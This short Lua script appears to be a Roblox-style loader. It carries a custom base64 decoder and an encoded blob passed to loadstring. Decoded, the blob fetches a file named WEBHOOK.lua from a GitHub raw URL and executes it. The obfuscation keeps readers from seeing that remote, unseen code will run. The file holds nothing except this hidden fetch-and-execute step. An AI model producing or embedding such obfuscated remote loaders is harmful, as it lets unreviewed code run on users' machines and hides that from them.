-- CarameloDevs Obfuscate
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
    data = data:gsub('[^'..b..'=]', '')
    local t = {}
    for i=1,#data,4 do
        local c1 = b:find(data:sub(i,i)) or 1
        local c2 = b:find(data:sub(i+1,i+1)) or 1
        local c3 = b:find(data:sub(i+2,i+2)) or 1
        local c4 = b:find(data:sub(i+3,i+3)) or 1
        local n = (c1-1)*262144 + (c2-1)*4096 + (c3-1)*64 + (c4-1)
        local b1 = math.floor(n / 65536) % 256
        local b2 = math.floor(n / 256) % 256
        local b3 = n % 256
        table.insert(t, string.char(b1))
        if data:sub(i+2,i+2) ~= '=' then table.insert(t, string.char(b2)) end
        if data:sub(i+3,i+3) ~= '=' then table.insert(t, string.char(b3)) end
    end
    return table.concat(t)
end

loadstring(decode([[bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9LYXJ5c3RvbkRldi9hcHBsaWNhdGlvbnMvcmVmcy9oZWFkcy9tYWluL1dFQkhPT0subHVhIikpKCk=]]))()

-- SHA-256: 8547a3486693f722125ed237bf5c21485eedd0bba7899fd52680c0eeb7ea4922
